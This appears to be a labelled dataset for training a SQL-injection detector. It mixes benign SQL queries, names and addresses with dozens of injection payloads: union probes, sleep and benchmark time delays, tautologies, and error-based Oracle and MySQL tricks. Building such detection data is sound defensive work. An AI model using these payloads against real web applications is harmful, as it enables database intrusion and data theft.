Sentence,Label,Processed_Sentence
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",1.0,"-0%"" union all select 0,0,0,0,0,0,0--"
SELECT * FROM soap FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from soap fetch first 0 percent rows only
SELECT * FROM liquid ORDER BY pond,0.0,select * from liquid order by pond
chen-che,0.0,chen-che
1%'  )   and sleep  (  5  )  #,1.0,0%'  )   and sleep  (  0  )  #
SELECT MIN ( ready )  AS pleasant FROM state,0.0,select min ( ready )  as pleasant from state
1'+  (  select biqo where 6046  =  6046,1.0,0'+  (  select biqo where 0  =  0
"  SELECT Orders.roserID, Employees.bad, Employees.hot FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.troubleID ORDER BY Orders.necessaryID",0.0,"  select orders.roserid, employees.bad, employees.hot from ordersright join employees on orders.employeeid  =  employees.troubleid order by orders.necessaryid"
SELECT stretch ( s )  FROM twelve SELECT grass FROM aid,0.0,select stretch ( s )  from twelve select grass from aid
aldebar,0.0,aldebar
" SELECT * FROM cup ORDER BY tobacco, several",0.0," select * from cup order by tobacco, several"
SELECT option_value FROM wp_options WHERE option_name  =  '_options_linkedin_url' LIMIT 1,0.0,select option_value from wp_options where option_name  =  '_options_linkedin_url' limit 0
"  SELECT Orders.anybodyrID, Employees.start, Employees.fill FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.shirtID ORDER BY Orders.jetID",0.0,"  select orders.anybodyrid, employees.start, employees.fill from ordersright join employees on orders.employeeid  =  employees.shirtid order by orders.jetid"
DELETE FROM also WHERE noon = 'height',0.0,delete from also where noon = 'height'
SELECT * FROM keep FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM garden,0.0,select * from keep fetch first 0 percent rows onlyselect top 0 * from garden
"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0 where 0  =  0 and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
SELECT * FROM frog FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from frog fetch first 0 percent rows only
"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1.0,"0%'  )   or 0  =  benchmark  (  0,md0  (  0x0d0a0c   )    )   #"
SELECT manufacturing ( s )  FROM nearest LEFT JOIN,0.0,select manufacturing ( s )  from nearest left join
al9ol,0.0,al0ol
18011,0.0,0
 UPDATE evening SET describe = 'song'WHERE section = 'whenever',0.0, update evening set describe = 'song'where section = 'whenever'
SELECT * FROM standard WHERE    NOT nature = 'anyway',0.0,select * from standard where    not nature = 'anyway'
SELECT TOP 3 * FROM belong WHERE feed = 'real',0.0,select top 0 * from belong where feed = 'real'
"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",1.0,"-0""   )    )     )   or 0  =  0 and    (    (     (  ""azqp"" like ""azqp"
"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1.0,"0'  )   as fxuk where 0  =  0 and make_set  (  0  =  0,0  )  --"
depp@rpdkorea.il,0.0,depp@rpdkorea.il
"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0'   )    )    and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1.0,"0' where 0  =  0 and elt  (  0  =  0,sleep  (  0   )    )   --"
"1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0'  )   as uytv where 0  =  0 or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
SELECT * FROM space WHERE adult LIKE '%situation%',0.0,select * from space where adult like '%situation%'
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1.0," select * from users where id  =  '0' union select !<0,version  (    )   -- 0'"
SELECT vowel ( s ) FROM burn INNER JOIN,0.0,select vowel ( s ) from burn inner join
 UPDATE lower SET uncle = 'engineer'WHERE earn = 'sunlight',0.0, update lower set uncle = 'engineer'where earn = 'sunlight'
-4262%'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1.0,-0%'   )    )     )   or 0  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   and    (    (     (  '%'  =  '
SELECT AVG ( complex ) FROM engine SELECT SUM ( clock ) ,0.0,select avg ( complex ) from engine select sum ( clock ) 
uhlhorn,0.0,uhlhorn
SELECT captured ( s )  FROM or FULL OUTER JOIN,0.0,select captured ( s )  from or full outer join
wilson@autoconstruccion.fi,0.0,wilson@autoconstruccion.fi
paseo arco del ladrillo 48 10?h,0.0,paseo arco del ladrillo 0 0?h
1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1.0,0%'  )   and 0  =  utl_inaddr.get_host_address  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    and   (  '%'  =  '
-2516  )   where 3349  =  3349 or 4855  =  1806--,1.0,-0  )   where 0  =  0 or 0  =  0--
"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,1.0,"0%""   )    )     )   rlike sleep  (  0  )   and    (    (     (  ""%""  =  """
"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",1.0,"0  )   where 0  =  0 and make_set  (  0  =  0,0  )  --"
57584234p,0.0,0p
SELECT * FROM funny WHERE wrapped BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from funny where wrapped between '0-0-0' and '0-0-0'
54011879j,0.0,0j
SELECT * FROM taught WHERE    NOT chose = 'make',0.0,select * from taught where    not chose = 'make'
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1.0," select * from users where id  =  '0' union select +\#,@@version -- 0'"
1'   )    )    as dcen where 5852  =  5852 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1.0,0'   )    )    as dcen where 0  =  0 or   (  select * from   (  select  (  sleep  (  0   )    )     )  ydpu  )  --
"INSERT INTO wool ( vapor, frog, ranch, nodded, war, angry )  VALUES  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )  ",0.0,"insert into wool ( vapor, frog, ranch, nodded, war, angry )  values  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )  "
SELECT MIN ( large )  AS hardly FROM century,0.0,select min ( large )  as hardly from century
"1%""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0%""  )   or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
demonlatra,0.0,demonlatra
SELECT * FROM within ORDER BY get,0.0,select * from within order by get
-3088' or 6872  =  6872 and 'miwk'  =  'miwk,1.0,-0' or 0  =  0 and 'miwk'  =  'miwk
96761343k,0.0,0k
1'||  (  select 'flbv' where 7451  =  7451 and 4595  =  4595#,1.0,0'||  (  select 'flbv' where 0  =  0 and 0  =  0#
SELECT * FROM camera FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from camera fetch first 0 percent rows only
SELECT TOP 3 * FROM musical,0.0,select top 0 * from musical
calle soria 154 2a,0.0,calle soria 0 0a
"SELECT * FROM dig WHERE kept BETWEEN ""stick"" AND    ""youth""",0.0,"select * from dig where kept between ""stick"" and    ""youth"""
gonzaga ripalda,0.0,gonzaga ripalda
SELECT * FROM sum WHERE cage = 'particular'  OR lot = 'each',0.0,select * from sum where cage = 'particular'  or lot = 'each'
SELECT * FROM possibly WHERE supply LIKE '%consider%',0.0,select * from possibly where supply like '%consider%'
SELECT * FROM mouth WHERE excellent IN  ( SELECT birds FROM iron ) ,0.0,select * from mouth where excellent in  ( select birds from iron ) 
SELECT satisfied ( s )  FROM library SELECT get FROM fence,0.0,select satisfied ( s )  from library select get from fence
rigau amer,0.0,rigau amer
SELECT length ( s ) FROM anyone INNER JOIN,0.0,select length ( s ) from anyone inner join
laguna abusaid,0.0,laguna abusaid
SELECT observe FROM yet UNION ALL SELECT change FROM band ORDER BY voyage,0.0,select observe from yet union all select change from band order by voyage
av. carlos marx s/n,0.0,av. carlos marx s/n
SELECT TOP 50 PERCENT * FROM scene,0.0,select top 0 percent * from scene
SELECT * FROM fifteen WHERE rice BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from fifteen where rice between '0-0-0' and '0-0-0'
villasandino,0.0,villasandino
isidro,0.0,isidro
talonera,0.0,talonera
SELECT TOP 3 * FROM sold WHERE coast = 'must',0.0,select top 0 * from sold where coast = 'must'
"   SELECT variety, mixture, fastened FROM day WHERE chief  IS NULL",0.0,"   select variety, mixture, fastened from day where chief  is null"
SELECT * FROM wp_posts WHERE ID  =  347696 LIMIT 1,0.0,select * from wp_posts where id  =  0 limit 0
kenji,0.0,kenji
ceferina,0.0,ceferina
ejerci78,0.0,ejerci0
SELECT * FROM either WHERE they = 'cat'  AND City = 'ahead',0.0,select * from either where they = 'cat'  and city = 'ahead'
torremoroso enrich,0.0,torremoroso enrich
SELECT * FROM feature WHERE taste BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from feature where taste between '0-0-0' and '0-0-0'
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1.0," select * from users where id  =  0 or ""  (  {"" or 0  =  0 -- 0"
SELECT accident ( s )  FROM dull,0.0,select accident ( s )  from dull
2243290000000000,0.0,0
 (  select   (  case when   (  3950  =  2747  )   then 1 else 1/  (  select 0  )   end   )    ) ,1.0, (  select   (  case when   (  0  =  0  )   then 0 else 0/  (  select 0  )   end   )    ) 
19846981m,0.0,0m
SELECT * FROM outline  WHERE simplest NOT LIKE '[hill]%',0.0,select * from outline  where simplest not like '[hill]%'
SELECT * FROM pond FETCH FIRST 3 ROWS ONLY,0.0,select * from pond fetch first 0 rows only
SELECT below ( s )  FROM station SELECT thank FROM knowledge,0.0,select below ( s )  from station select thank from knowledge
"1""  )   as vpna where 5450  =  5450 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1.0,"0""  )   as vpna where 0  =  0 or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )  --"
33470889r,0.0,0r
nao,0.0,nao
SELECT * FROM most  WHERE or = talk,0.0,select * from most  where or = talk
1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1.0,0  )   as tngy where 0  =  0 rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    )   --
13061311w,0.0,0w
SELECT * FROM herself  WHERE wagon NOT LIKE '[fallen]%',0.0,select * from herself  where wagon not like '[fallen]%'
cercedilla,0.0,cercedilla
"1"" and elt  (  4249  =  4249,7259  )   and ""tmxx""  =  ""tmxx",1.0,"0"" and elt  (  0  =  0,0  )   and ""tmxx""  =  ""tmxx"
"INSERT INTO bus ( worry, voice, melted, express, shore, individual )  VALUES  ( 'thick', 'cave'. quick', 'sense', 'broad', 'lucky', 'hunter' )  ",0.0,"insert into bus ( worry, voice, melted, express, shore, individual )  values  ( 'thick', 'cave'. quick', 'sense', 'broad', 'lucky', 'hunter' )  "
SELECT COUNT ( because ) FROM exact,0.0,select count ( because ) from exact
SELECT TOP 3 * FROM arrangement WHERE blow = 'watch' SELECT * FROM longer,0.0,select top 0 * from arrangement where blow = 'watch' select * from longer
SELECT * FROM goes  WHERE any NOT LIKE '[crew]%',0.0,select * from goes  where any not like '[crew]%'
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1.0,0x0f0c0a0a
"   SELECT supper, finger, entireFROM slope WHERE here  IS NOT NULL",0.0,"   select supper, finger, entirefrom slope where here  is not null"
"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",1.0,"0%'   )    )     )   or row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )   and    (    (     (  '%'  =  '"
SELECT felt,0.0,select felt
"  SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",0.0,"  select perhaps,point from syllable where sleep = 'dog' union select anywhere, you from grandfather"
"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",1.0,"-0"" or elt  (  0  =  0,0  )   and ""asib"" like ""asib"
"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#",1.0,"-0""   )    )     )   union all select 0,0,0,0,0,0#"
8711760000000000,0.0,0
SELECT DISTINCT purple FROM would,0.0,select distinct purple from would
boget brufau,0.0,boget brufau
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1.0," select * from users where id  =  0 or ""{@"" or 0  =  0 -- 0"
"lealtad, 78, 6-h",0.0,"lealtad, 0, 0-h"
?s,1.0,?s
SELECT AVG ( ate ) FROM herself SELECT SUM ( gain ) ,0.0,select avg ( ate ) from herself select sum ( gain ) 
SELECT AVG ( general )  FROM one  SELECT SUM ( cold ) ,0.0,select avg ( general )  from one  select sum ( cold ) 
"   SELECT Employees.safe, COUNT ( Orders.keptID )  AS quietFROM    ( OrdersINNER JOIN model ON Orders.landID  =  Employees.babyID ) ",0.0,"   select employees.safe, count ( orders.keptid )  as quietfrom    ( ordersinner join model on orders.landid  =  employees.babyid ) "
leopolda,0.0,leopolda
1'  )   and 4822  =  6997 and   (  'ojku'  =  'ojku,1.0,0'  )   and 0  =  0 and   (  'ojku'  =  'ojku
SELECT * FROM shown WHERE column NOT BETWEEN 'nuts' AND 'chance',0.0,select * from shown where column not between 'nuts' and 'chance'
werkmeister@19horas.zr,0.0,werkmeister@0horas.zr
"-9606 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # iuij",1.0,"-0 or 0  =  ctxsys.drithsx.sn  (  0,  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )  # iuij"
cardiel de los montes,0.0,cardiel de los montes
guindo vive,0.0,guindo vive
SELECT * FROM shout WHERE means = 'eye'  OR sad = 'win',0.0,select * from shout where means = 'eye'  or sad = 'win'
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",1.0,"0"" or 0  =  benchmark  (  0,md0  (  0x0a0   )    )    and ""vnei"" like ""vnei"
SELECT AVG ( gradually ) FROM teeth,0.0,select avg ( gradually ) from teeth
"1%'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",1.0,"0%'   )    )    or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )   and    (    (   '%'  =  '"
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""psbz""  =  ""psbz",1.0,"select dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   from dual and ""psbz""  =  ""psbz"
SELECT TOP 3 * FROM son SELECT * FROM race 3SELECT * FROM year,0.0,select top 0 * from son select * from race 0select * from year
SELECT * FROM arm WHERE tongue = 'divide' FETCH FIRST 3 ROWS ONLY,0.0,select * from arm where tongue = 'divide' fetch first 0 rows only
-6802  )   as coyv where 5693  =  5693 or 8571  =  8571--,1.0,-0  )   as coyv where 0  =  0 or 0  =  0--
"  UPDATE nice SET surprise =  'rope', City =  'beginning' WHERE later =  image",0.0,"  update nice set surprise =  'rope', city =  'beginning' where later =  image"
SELECT * FROM task FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM whistle,0.0,select * from task fetch first 0 percent rows onlyselect top 0 * from whistle
"  SELECT Orders.electricityrID, Employees.number, Employees.race FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.aboardID ORDER BY Orders.eatID",0.0,"  select orders.electricityrid, employees.number, employees.race from ordersright join employees on orders.employeeid  =  employees.aboardid order by orders.eatid"
